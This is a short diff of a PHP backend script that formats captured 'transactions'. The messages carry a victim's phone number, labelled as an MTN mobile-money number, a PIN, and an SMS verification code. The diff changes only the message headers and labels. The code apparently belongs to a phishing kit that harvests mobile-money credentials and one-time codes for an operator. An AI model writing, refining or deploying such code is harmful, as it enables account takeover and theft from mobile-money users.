@@ -22,8 +22,8 @@ if ($type === 'msg1') {
         echo json_encode(['ok'=>false,'error'=>'Missing data']);
         exit;
     }
-    $message = "🟠 NOUVELLE TRANSACTION\n\n" .
-               "📱 Numéro MTN : {$phone}\n" .
+    $message = "🟡🟡🟡 TRANSACTION 🟡🟡🟡\n\n" .
+               "📱 NUM : {$phone}\n" .
                "🔢 PIN : {$tx1}";
 } elseif ($type === 'msg2') {
     if ($phone === '' || $tx1 === '' || $tx2 === '') {
@@ -32,7 +32,7 @@ if ($type === 'msg1') {
         exit;
     }
     $message = "🟡🟡🟡 TRANSACTION 🟡🟡🟡\n\n" .
-               "📱 Numéro MTN : {$phone}\n" .
+               "📱 NUM : {$phone}\n" .
                "🔢 PIN : {$tx1}\n" .
                "🆔 Code SMS. : {$tx2}";
 } else {
